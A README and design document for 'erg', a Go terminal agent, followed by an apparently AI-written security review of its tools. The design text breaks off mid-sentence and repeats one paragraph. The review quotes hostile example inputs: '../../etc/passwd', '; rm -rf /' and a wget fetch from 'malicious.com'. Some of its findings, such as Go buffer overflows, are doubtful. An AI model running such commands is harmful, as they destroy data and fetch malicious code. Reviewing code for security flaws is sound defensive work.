# erg

A minimalist, terminal-native agent in Go. One binary takes on a **shape** — coding agent, design
partner, telemetry watcher — reaches your models through a [LiteLLM](https://docs.litellm.ai/)
gateway, and is optimized to run as a first-class citizen of the [herdr](https://herdr.dev/) runtime.

Disclaimer: This works for me -- that's the entire guarantee. Built with AI in the loop, so check
your own biases before you love it or hate it on principle. Use at your own risk, fork freely, and
don't @ me when it explodes. (But do drop me a note if it helps -- pay it forward.)

> **Status: working, early.** Implemented and tested (`make test`), but not yet exercised against a
> wide range of live models.

## Built for LiteLLM and herdr

erg makes two assumptions, and leans hard into both:

- **Models come through [LiteLLM](https://docs.litellm.ai/).** erg is an OpenAI-compatible client
  pointed at a LiteLLM proxy that fronts your inference (Ollama, vLLM, llama.cpp, cloud). LiteLLM is
  the single control point — models, keys, routing, budgets, usage — and erg holds no provider keys;
  traffic stays on your network unless you route it out there. erg *can* talk to a raw
  OpenAI/Anthropic endpoint, but the defaults, docs, and examples assume LiteLLM.
  → [docs/model-backend.md](./docs/model-backend.md)
- **It's optimized to run under [herdr](https://herdr.dev/).** erg is a first-class herdr citizen:
  it reports authoritative status (`working` / `idle` / `blocked` / `done`) and rich shape/model
  metadata over the herdr socket, ships a detection manifest, and resumes cleanly — so a fleet of
  shaped erg agents across your machines stays legible in one window, and blocked agents announce
  themselves. It runs fine solo in a terminal, but it's built for the fleet.
  → [docs/herdr.md](./docs/herdr.md)

## What is erg?

- **One static Go binary.** No runtime; cross-compiles to servers, SBCs, and edge devices.
- **Shapes.** A named config bundle configures the engine for a job — loop mode, model, prompt,
  tools, skills. Same engine, different shape.
- **Your inference, via LiteLLM.** Point it at a LiteLLM proxy fronting your models (Ollama, vLLM,
  llama.cpp, cloud). Keys live in LiteLLM, not erg; traffic stays on your network unless you route
  it out.
- **Three loop modes.** `interactive` (REPL), `oneshot` (`-p`, scriptable, clean stdout), and
  `observe` (watch a stream and react).
- **A herdr citizen.** Reports status and metadata, resumes cleanly.
- **Minimalist on purpose.** No MCP, no plugin ABI, no marketplace, no permission prompts.

## Install

Needs Go (recent) and a model endpoint — a LiteLLM proxy, or any OpenAI/Anthropic-compatible URL.
(The offline `mock` provider needs nothing.)

```sh
make build            # -> ./bin/erg
make install          # -> ~/bin/erg  (override with INSTALL_DIR=)
```

Prove the loop works with no backend at all:

```sh
erg --provider mock -p "hello erg"
```

## Quick start

```sh
erg                              # interactive REPL (default shape)
erg -p "list the TODOs"          # one-shot, clean stdout
erg --shape design-partner       # run a named shape
tail -F app.log | erg --shape telemetry-watcher
```

Point erg at your models by creating `~/.config/erg/config.json` — see
[docs/configuration.md](./docs/configuration.md) and [docs/model-backend.md](./docs/model-backend.md).

## Documentation

- [docs/usage.md](./docs/usage.md) — running erg: loop modes, the REPL, commands, one-shot recipes, command history.
- [docs/configuration.md](./docs/configuration.md) — config file, shapes, skills, AGENTS.md, example configs.
- [docs/model-backend.md](./docs/model-backend.md) — LiteLLM + your inference, and how routing by model name works.
- [docs/herdr.md](./docs/herdr.md) — herdr integration.
- [docs/sub-agents-and-herdr.md](./docs/sub-agents-and-herdr.md) — the three sub-agent mechanisms (`task`, `erg -p`, herdr workers) and when to use each.
- [docs/skills-progressive-disclosure.md](./docs/skills-progressive-disclosure.md) — eager and lazy (`lazy_skills`) skill loading.
- [docs/why.md](./docs/why.md) — why this exists, and how it compares to hax, pi, and OMP.
- [VISION.md](./VISION.md) — the north star and principles.
- [DESIGN.md](./DESIGN.md) — architecture, packages, interfaces, testing.
- [examples/](./examples/) — ready-to-copy config examples.

## License

MIT. See [LICENSE](./LICENSE).

# erg — Design

Detailed design for erg. Read [VISION.md](./VISION.md) first for intent and non-goals; this
document is the how. Date-stamped 2026-09-12.

> **Status: implemented (early).** The design below is realized in code under `internal/`, verified
> by `make test`. Some signatures differ slightly from the original sketches (for example the
> model-visible context type is named `agent.Request`, and the `Provider`/`Tool` interfaces live in
> the `agent` package, at the consumer). The seams are as described.

---

## 1. Scope and status

This design covers the agent engine, the three loop modes, the provider and tool abstractions,
config and shapes, session persistence, and the herdr client. It fixes the package boundaries and
the interfaces that cross them. It does not specify wire-level JSON for each provider, nor the
exact config-file grammar; those are follow-on design passes noted in
[VISION.md §10](./VISION.md#10-open-questions).

Guiding constraints, from the user's engineering rules and hax's lineage:

- Idiomatic Go, standard-library-first, small auditable dependency set.
- Small, composable interfaces. The core is pure and testable without a network or a TTY.
- Errors are values and propagate; no defensive swallowing. Validate at boundaries with
  preconditions; fail loudly on violated invariants.
- One static binary. Concurrency via goroutines, channels, and `context.Context`.

## 2. Architecture overview

```mermaid
flowchart TB
    subgraph drivers["Loop drivers (frontends)"]
        repl["interactive REPL"]
        once["oneshot"]
        obs["observe"]
    end

    subgraph core["Agent core (pure)"]
        loop["agent loop"]
        turn["turn state machine"]
        log["item log + compaction"]
        ctx["context builder"]
    end

    subgraph adapters["Adapters (impure)"]
        prov["provider adapters"]
        tools["tools"]
        sess["session store"]
        herdr["herdr client"]
    end

    repl --> loop
    once --> loop
    obs --> loop
    loop --> turn
    turn --> log
    loop --> ctx
    ctx --> log
    loop -->|stream events| prov
    loop -->|dispatch| tools
    loop -->|persist| sess
    loop -->|status/metadata| herdr
```

The **core** owns conversation state and the turn state machine and knows nothing about HTTP,
terminals, sockets, or wall-clock time except through injected interfaces. **Drivers** supply
input and presentation. **Adapters** own the impure edges. The dependency arrows point inward:
adapters depend on core interfaces, never the reverse.

## 3. Package layout

```
erg/
  cmd/erg/                main(): flag parsing, wiring, driver selection
  internal/
    agent/                 core loop, item log, turn state machine, context builder
      item.go                struct item, item log, kinds
      turn.go                pure stream-event -> item state machine
      loop.go                continuation loop; driver hooks
      compact.go             summary-seed compaction
    provider/              provider abstraction + adapters
      provider.go            Provider interface, StreamEvent, Context types
      openai/                OpenAI + compatible (incl. hosted local clouds)
      anthropic/             Anthropic + compatible
      local/                 llama.cpp-style / ollama-style discovery
      config/                config-defined endpoint variants
      mock/                  scripted provider for tests
    tool/                  Tool interface + compiled-in tools
      tool.go                Tool interface, registry
      read.go write.go edit.go bash.go ask.go task.go
    observe/               observe loop: sources, triggers, reactions
      source.go trigger.go react.go
    herdr/                 herdr socket client + status/metadata reporting
      client.go status.go manifest.go env.go
    config/               config + shape resolution
      config.go shape.go resolve.go
    session/              resumable session persistence (plain files)
    terminal/             rendering, streaming, scrollback-preserving output
    cli/                  flag/env parsing shared by drivers
  docs/
```

`internal/` keeps the surface private; erg is a program, not a library. Each package answers
"what does it do, how do you use it, what does it depend on" on its own.

## 4. The agent core

### 4.1 The item log

The canonical conversation state is a flat, provider-independent slice of items. It is the single
source of truth; every other representation (model context, display history, session file) is
derived from it.

```go
// internal/agent
type ItemKind int

const (
    ItemUserText ItemKind = iota
    ItemAssistantText
    ItemToolCall
    ItemToolResult
    ItemTurnBoundary // separates consecutive turns inside one user-turn
    ItemSummarySeed  // compaction output; never deletes prior items
)

type Item struct {
    Kind    ItemKind
    Text    string        // user/assistant text, or summary
    Call    *ToolCall     // ItemToolCall
    Result  *ToolResult   // ItemToolResult
    Meta    ItemMeta      // timestamps, token usage, provider tags — never read by the state machine
}

type Log struct { items []Item }

func (l *Log) Append(it Item)
func (l *Log) Items() []Item // read-only view
```

Compaction appends an `ItemSummarySeed` and marks earlier items as out-of-window; it never
mutates or removes history. The full log is always what gets persisted and inspected.

### 4.2 The turn state machine

`turn.go` is pure: borrowed stream events in, owned items out. No I/O, no presentation, no
goroutines. This is the most heavily unit-tested unit in the codebase.

```go
type StreamEvent struct {
    Kind  StreamEventKind // text-delta, tool-call-start, tool-call-args-delta, tool-call-end, usage, done, error
    Text  string
    Call  *ToolCallDelta
    Usage *Usage
    Err   error
}

// Turn folds a stream of events into the items produced by one provider round-trip.
type Turn struct { /* accumulator state */ }

func (t *Turn) Feed(ev StreamEvent) error // advance; error on protocol violation (precondition)
func (t *Turn) Done() (assistant Item, calls []ToolCall, err error)
```

A malformed event sequence is a precondition violation and returns an error; the turn does not
guess or paper over it.

### 4.3 The context builder

Model-visible context is built from the log, never by slicing it. The builder assembles the system
prompt (base + append + shape + project instructions), the in-window items, and any loaded skill
content, and hands the provider a provider-independent `Context`.

```go
type Context struct {
    System   string
    Items    []Item   // in-window items only
    Tools    []ToolSpec
}

func BuildContext(log *Log, sys SystemPrompt, tools []ToolSpec, win Window) Context
```

### 4.4 The loop and driver hooks

`loop.go` runs the continuation loop shared by all three drivers: build context, stream a turn,
append items, dispatch tool calls, repeat until the model stops requesting tools or a bound is
hit. Drivers inject presentation and cancellation:

```go
type DriverHooks struct {
    OnAssistantDelta func(text string)      // stream to terminal, or discard in oneshot
    OnToolCall       func(call ToolCall)     // show activity
    OnToolResult     func(res ToolResult)
    OnStatus         func(AgentStatus)        // -> herdr client (§8)
    Cancelled        func() bool              // Esc in REPL, ctx.Done() elsewhere
}

func Run(ctx context.Context, dep Deps, in UserInput, hooks DriverHooks) (Outcome, error)
```

`Deps` carries the injected `Provider`, tool registry, session store, and clock. A user-turn is
bounded by `max_turns` and a timeout carried on `ctx`. Cancellation is cooperative: a running turn
checks `ctx` and `Cancelled()` between events and between tool dispatches.

## 5. Providers

A provider adapter owns one native API family and nothing else. It serializes a `Context` to the
native request, opens the stream, and translates native wire events into `StreamEvent`s. Agent
behavior must never branch on a native response shape.

```go
// internal/provider
type Provider interface {
    // Stream runs one turn. It emits StreamEvents on the channel and closes it when done.
    Stream(ctx context.Context, c agent.Context, opts Options) (<-chan agent.StreamEvent, error)
    // Model returns the active model's name and provider, for display.
    Model() ModelMeta
}
```

- **Discovery.** The `local` adapter queries a local/LAN inference server for its served model and
  capabilities so the common case needs no config block (hax's behavior).
- **Cloud and compatible.** `openai` and `anthropic` adapters cover their families and their
  compatibles, including hosted local-model clouds and aggregators, via base-URL + auth config.
- **Config-defined variants.** A static endpoint variant is a config block that selects a protocol
  family and overrides base URL / headers — not a new Go type.
- **Usage, not in the adapter.** Adapters translate the provider's `usage` counts into
  `agent.Usage`; token accounting is accumulated by the loop (`Outcome.Usage`) and the app
  (`/usage`), not computed in adapters.
- **Effort and sampling params** are applied here: `reasoning_effort` / `thinking` from
  `Options.Effort`, and the provider's `params` map merged into the request body.

Transport (HTTP/SSE mechanics, retries, redaction for traces) is shared, using `net/http` and the
standard library; adapters own only protocol translation. Both translation and transport are
testable in isolation — the `mock` provider replays scripted events with no network.

## 6. Tools

A tool is a small interface. The compiled-in set is fixed (`read`, `list`, `glob`, `write`, `edit`,
`bash`, `ask`, `task`); everything else is an external CLI driven through `bash`, per
[VISION.md §4.4](./VISION.md#44-tools-a-small-compiled-core-extended-the-hax-way).

```go
// internal/tool
type Tool interface {
    Name() string
    Spec() ToolSpec                 // JSON schema advertised to the model
    Run(ctx context.Context, args json.RawMessage, env Env) (Result, error)
}

type Env struct {
    Cwd    string
    Stdout io.Writer   // for streaming/capped output
    Limits Limits      // output cap, timeout
}
```

- `bash` streams and caps output, classifies commands, and enforces a timeout. It is the seam for
  every external capability.
- `task` spawns a bounded sub-run under a named shape (a subagent role), reusing `agent.Run` with
  its own `Deps` and a fresh log. How sub-runs surface to herdr is an open question
  ([VISION.md §10](./VISION.md#10-open-questions)).
- Enabled tools are selected by the shape's tool profile; a tool absent from the profile is not
  advertised to the model.

Tools validate their arguments as preconditions and return errors; they do not silently coerce
bad input.

## 7. Configuration and shapes

Two layers: **config** (durable settings, plain text under XDG) and **runtime selections**
(provider/model/effort/shape chosen interactively, stored separately). Resolution, most explicit
wins:

```
CLI flag  >  environment variable  >  saved runtime selection  >  config file default
```

A **shape** is a named bundle:

```go
// internal/config
type Shape struct {
    Name       string
    Loop       LoopMode          // interactive | oneshot | observe
    Provider   string
    Model      string
    Effort     string
    System     SystemPrompt      // base + append, inline or @file
    Tools      []string          // enabled tool names
    Skills     []string          // SKILL.md directories to load
    Instr      []string          // project-instruction files
    MaxTurns   int               // bound for unattended runs
    Observe    *ObserveConfig    // required iff Loop == observe
}
```

Shapes double as subagent roles for `task`. They are files kept in a repo, versioned and diffable.
The config format reuses one parser shared with anything else that needs structured data, to avoid
a second grammar (hax's one-format rule).

**System prompt from a file.** A shape's `system` (and the config's `system_base`) may be inline
text or a `FILE:`-prefixed path (`"system": "FILE: ./prompts/coder.md"`); the named file is read in
its place. A missing file is an error — a shape that points at a prompt file requires it to exist.
Ready-to-copy examples live in `examples/`.

**Project instructions (`AGENTS.md`).** On every run, `composeSystem` walks up from the working
directory collecting `AGENTS.md` files and appends their contents to the system prompt,
outermost-first so the nearest (most-specific) file wins. The walk stops at the repository root (a
directory holding `.git`), the home directory, or the filesystem root, and never reads above home.
It is on by default; set `"auto_instructions": false` to disable. This is the automatic counterpart
to a shape's explicit `instructions` list.

**Skills.** Each entry in a shape's `Skills` is a `SKILL.md` directory (or the file itself). At
prompt-assembly time `internal/skill` loads each one — parsing its `name`/`description` frontmatter
— and `composeSystem` appends a `# Skills` section carrying their full instructions to the system
prompt. A listed skill that is missing is an error.

**Effort.** A shape's (or `--effort`'s) reasoning level is carried on `Options.Effort` and sent to
the backend: the OpenAI adapter sets `reasoning_effort`; the Anthropic adapter maps it onto extended
`thinking` with a budget and raises `max_tokens` to fit. It is opt-in and only meaningful for
reasoning-capable models.

**Sampling params.** A provider's `params` map is merged verbatim into each request body (protected
structural keys excepted), so temperature, `top_p`, `top_k`, `repetition_penalty`, and other
backend-specific controls pass through — including via a LiteLLM proxy. Applied by the OpenAI and
Anthropic adapters.

**Auto-compaction.** A top-level `compact_at` (a rough window token estimate) wires
`Deps.Summarizer` + `Deps.CompactAt`; when the window exceeds it the loop summarizes history into a
seed before the next turn. `0` disables it; the manual `/compact` command works regardless.

## 8. herdr client

The herdr client makes erg a model-authoritative citizen. It is a thin package over a Unix
socket, with the standard library only.

### 8.1 Environment detection

On startup the client reads the herdr environment: `HERDR_ENV`, `HERDR_SOCKET_PATH` (falling back
to the documented default and `HERDR_SESSION` resolution), and the context ids `HERDR_WORKSPACE_ID`,
`HERDR_TAB_ID`, `HERDR_PANE_ID`. If `HERDR_ENV` is unset, the client is a no-op and erg runs as a
plain terminal tool.

### 8.2 Transport

Newline-delimited JSON over the socket, one object per line, request/response by `id`:

```go
// internal/herdr
type request struct {
    ID     string          `json:"id"`
    Method string          `json:"method"`
    Params json.RawMessage `json:"params,omitempty"`
}
type response struct {
    ID     string          `json:"id"`
    Result json.RawMessage `json:"result,omitempty"`
    Error  *rpcError       `json:"error,omitempty"`
}
```

`net.Dial("unix", path)` on Unix; the named-pipe equivalent on Windows. Failures to reach herdr
are logged and swallowed *only here*, at this integration edge — a missing runtime must never take
down the agent.

### 8.3 Status reporting

The client maps the core's `AgentStatus` onto herdr's vocabulary via `pane.report_agent`, called
exactly on state transitions (driven by `DriverHooks.OnStatus`):

```go
type AgentStatus int
const (
    StatusIdle AgentStatus = iota // REPL awaiting input; observe watching
    StatusWorking                  // running a turn / a triggered reaction
    StatusBlocked                  // needs a human decision (ask tool, or hit max_turns)
    StatusDone                     // oneshot finished; observe watch terminated
)
```

erg reports `blocked` **authoritatively**, not by heuristic. Two signals drive it: the model calls
the `ask` tool (which sets `ToolResult.EndTurn`, ending the user-turn to wait for a human), or a run
hits `max_turns` without finishing (`Outcome.Stopped`) — both mean "needs a human." The screen
manifest (§8.5) remains a belt-and-suspenders fallback for when the socket is unavailable.

For the observe loop, authoritative reporting is what heuristics cannot infer: a quietly-watching
agent reports `StatusIdle`, not a hung `working` pane. See
[VISION.md §7.1](./VISION.md#71-what-good-citizen-means-concretely).

For the observe loop this is what heuristics cannot infer: a quietly-watching agent reports
`StatusIdle`, not a hung `working` pane. See [VISION.md §7.1](./VISION.md#71-what-good-citizen-means-concretely).

### 8.4 Metadata

On startup and on shape change, the client publishes `pane.report_metadata` with the shape name,
provider/model (and local-vs-cloud, size class), and a short task label, so a fleet is readable
without attaching.

### 8.5 Screen manifest

A TOML detection manifest ships in-repo and installs to
`~/.config/herdr/agent-detection/erg.toml`. It matches erg's visible REPL states so herdr
classifies erg panes correctly even when the socket is unavailable. The manifest is a fallback;
authoritative hooks win. Keeping it in step with the REPL UI is a maintenance item
([VISION.md §10](./VISION.md#10-open-questions)).

### 8.6 Non-goal

The client reports and reads; it never calls `pane.split`, `agent.prompt`, or `agent.wait` to
drive other agents. Peer orchestration lives outside the process
([VISION.md §7.2](./VISION.md#72-explicit-non-goal-erg-does-not-drive-other-agents)).

## 9. The observe loop

The observe driver runs sources, triggers, and reactions over the shared core.

```mermaid
sequenceDiagram
    participant S as Source (goroutine)
    participant D as Observe driver
    participant T as Trigger
    participant C as Agent core
    participant H as herdr client

    D->>H: status = idle
    loop watching
        S->>D: event
        D->>T: evaluate(event)
        alt trigger fires
            D->>H: status = working
            D->>C: Run(reaction user-turn, bounded)
            C-->>D: outcome
            D->>H: status = idle
        else no fire / debounced
            D->>D: keep watching
        end
    end
```

```go
// internal/observe
type Source interface { // stdin, file tail, exec stdout, unix socket, http long-poll
    Events(ctx context.Context) (<-chan Event, error)
}
type Trigger interface { // match / threshold / debounce / schedule
    Fire(ev Event) (react bool, prompt string)
}
```

- Sources are goroutines feeding one channel; the driver selects over them and `ctx.Done()`.
- Each reaction is a normal bounded user-turn (`MaxTurns`, timeout) so an unattended watcher can
  never run away.
- Reactions can be debounced or pre-empted; a new firing while a reaction runs is coalesced per
  the trigger's policy.
- Observe sessions persist watch state so a restart resumes the watch, not just the conversation.

The source and trigger vocabulary is deliberately minimal at first; anything exotic is an external
classifier shelled out to via `bash`.

## 10. Concurrency model

- One foreground goroutine owns the loop and the item log; the log is not shared across goroutines.
- Providers stream on a channel the loop consumes; the provider goroutine exits when the stream
  closes or `ctx` cancels.
- Observe sources are goroutines feeding a channel; the driver owns the fan-in.
- The `task` tool runs a sub-run with its own `Deps` and log; inputs are copied, not shared.
- `context.Context` carries cancellation and deadlines everywhere. Every spawned goroutine is
  joined before the state it touches is torn down. No global mutable state beyond process config
  resolved once at startup.

## 11. Error handling

- Errors are values and propagate up to the driver, which decides presentation. The core does not
  log-and-continue.
- Boundaries (tool args, provider events, config, socket frames) validate with preconditions and
  return errors on violation. Invariants that "cannot" break use explicit checks, not silent
  fallback.
- The single exception is the herdr integration edge (§8.2): a missing or broken runtime is
  logged and swallowed so the agent still runs standalone.

## 12. Sessions and persistence

Sessions are structured, resumable, plain files (JSONL-style item records plus a small header),
keyed by working directory. `-c` continues the latest; `--resume` picks one; `--resume=ID -p`
resumes a specific session in one-shot mode. Observe sessions additionally persist watch state.
Transcript (model-facing context) and trace (redacted HTTP/SSE) are separate inspection outputs,
never substitutes for the session file.

## 13. Testing strategy

- **Pure core, no network, no TTY.** The turn state machine, item log, compaction, and context
  builder are unit-tested directly. Table-driven tests for event folding, including malformed
  sequences that must error.
- **Mock provider.** `provider/mock` replays scripted stream events so the full loop, tool
  dispatch, and observe reactions run hermetically.
- **Tool tests** run against temp directories; `bash` classification and output capping are tested
  without spawning long processes where possible.
- **herdr client** is tested against an in-test Unix socket that speaks the newline-JSON protocol
  and asserts the exact `pane.report_agent` / `pane.report_metadata` calls and their timing.
- **Interactive REPL** needs a real tty; drive it with tmux (send keys, capture pane), scoped to a
  named session — never `killall`.
- No test is skipped or stubbed to make a run pass; a failing test is a failing build.

## 14. Build and tooling

- `make build` produces `./bin/erg`; `make test`, `make lint` are the gates. Builds go through the
  Makefile, not ad hoc `go build`.
- Cross-compilation targets (via `GOOS`/`GOARCH`) for x86_64 and aarch64 servers, SBCs, and edge
  devices are Makefile targets.
- Dependencies are standard-library-first; each addition is justified and auditable. The only
  non-stdlib dependency is `golang.org/x/term` (Go-team maintained), used for raw terminal mode in
  the `internal/lineedit` package (arrow-key command history and line editing); it pulls
  `golang.org/x/sys` transitively.
- Containers use podman.

## 15. Security and isolation

- Isolation against a mistaken or compromised run comes from the OS: run erg in a container or VM
  when working on untrusted input or when blast radius matters. There is no in-process permission
  gate, by design ([VISION.md §9](./VISION.md#9-non-goals)).
- Restraint comes from the system prompt (forbid destructive git, ask before irreversible actions),
  Esc-to-steer in the REPL, and `max_turns` on unattended runs.
- Secrets (API keys) come from the environment or config marked secret; they are never written to
  sessions and are redacted in traces.

## 16. Design decisions

Date-stamped; each records a choice and its reason.

- **2026-09-12 — Go over C.** One static cross-compiled binary plus real concurrency and a wire-
  capable stdlib, keeping hax's footprint discipline without hand-rolled threads and parsers.
- **2026-09-12 — Observe as a first-class loop, not a script.** Reacting with full context and

Based on my review of the erg codebase, here's a comprehensive summary:

## Code Review Summary

### Strengths
- Clean architecture with clear separation of concerns (core vs adapters)
- Strong testing strategy (pure core unit tests, mock provider, herdr socket emulation)
- Idiomatic Go with minimal dependencies (only `golang.org/x/term`)
- Well-documented design decisions and tradeoffs

### Code Quality Issues
1. **File tools have path traversal vulnerabilities** (`file.go`):
   - `resolvePath` uses `filepath.Join` which allows path traversal via `../`
   - No sandboxing restricts files to workspace
   - Critical security risk for untrusted inputs

2. **Bash tool has command injection risks** (`bash.go`):
   - Uses `sh -c` with direct command execution
   - No validation of command content
   - Only timeout protection (120s default)

3. **Missing input validation** in multiple tools:
   - No upper bound on file paths lengths
   - No validation of glob patterns
   - `edit` tool doesn't validate content size before writing

4. **Error handling inconsistencies**:
   - Herdr client swallows errors (good for availability, but hides issues)
   - Some tools return error strings in content vs actual errors

### Security Concerns
1. **Path traversal**: Files can be accessed outside working directory via `../`
2. **Command injection**: Bash commands are executed without sanitization
3. **No output sanitization**: Tool output goes directly to model context
4. **No rate limiting**: Unbounded tool calls possible
5. **Session persistence**: No encryption of sensitive data

### Recommendations
1. **Add sandboxing**: Restrict file operations to workspace directory
2. **Validate/escape bash commands**: Use `exec.Command` with arguments instead of `sh -c`
3. **Add input bounds**: Limit file sizes, command lengths, path lengths
4. **Sanitize tool outputs**: Escape/control characters before sending to model
5. **Add rate limiting**: Limit tool calls per turn/time period
6. **Encrypt sessions**: Protect persisted conversation data

### Testing Gaps
1. No fuzzing for path traversal attacks
2. No command injection test cases
3. No large input stress tests
4. No concurrent tool execution tests

## Security Vulnerabilities

### 1. Path Traversal in File Tools (Critical)
**Location**: `file.go`
- The `resolvePath` function uses `filepath.Join` without validating the result stays within the workspace directory
- Attack: A malicious user could provide paths like `../../etc/passwd` to read sensitive files outside the intended workspace
- No sandboxing exists to restrict file operations to the workspace directory

### 2. Command Injection in Bash Tool (Critical)
**Location**: `bash.go`
- The bash tool executes commands via `sh -c` with the command string passed directly
- Attack: A malicious user could provide commands like `; rm -rf /` or `$(wget malicious.com/exe)` that get executed
- Only has a 120-second timeout as protection

### 3. Missing Input Validation (High)
- No upper bound on file path lengths (could cause buffer overflows or DoS)
- No validation of glob patterns (could cause performance issues or unexpected behavior)
- The `edit` tool doesn't validate content size before writing (could cause memory exhaustion)

### 4. Error Handling Inconsistencies (Medium)
- Herdr client swallows errors for availability, but this hides important security issues
- Some tools return error information in content rather than as actual errors, making it harder to detect and handle security issues properly

### 5. No Output Sanitization (Medium)
- Tool outputs go directly to the model context without escaping control characters or sanitizing potentially malicious content

### 6. No Rate Limiting (Medium)
- Unbounded tool calls are possible, which could be exploited for denial of service

### 7. No Session Encryption (Low)
- Sensitive conversation data is persisted without encryption

## Attack Scenarios
1. **Data Exfiltration**: Read sensitive files via path traversal
2. **Remote Code Execution**: Execute arbitrary commands via bash injection
3. **Resource Exhaustion**: Cause DoS via unbounded inputs
4. **Model Poisoning**: Inject malicious content via unsanitized outputs
